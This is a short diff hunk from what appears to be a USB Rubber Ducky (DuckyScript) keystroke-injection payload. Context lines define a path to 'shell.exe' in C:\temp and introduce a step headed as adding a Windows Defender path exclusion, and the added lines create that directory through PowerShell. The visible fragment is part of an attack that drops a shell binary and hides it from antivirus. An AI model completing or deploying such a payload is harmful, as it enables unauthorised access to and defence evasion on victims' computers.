@@ -25,6 +25,8 @@ STRING $dir = "C:\temp"
 ENTER
 STRING $shell = "$dir\shell.exe" 
 ENTER
+STRING New-Item -Path $dir -ItemType Directory
+ENTER
 DELAY 250
 
 REM |===Add path exclusion to Windows Defender===|
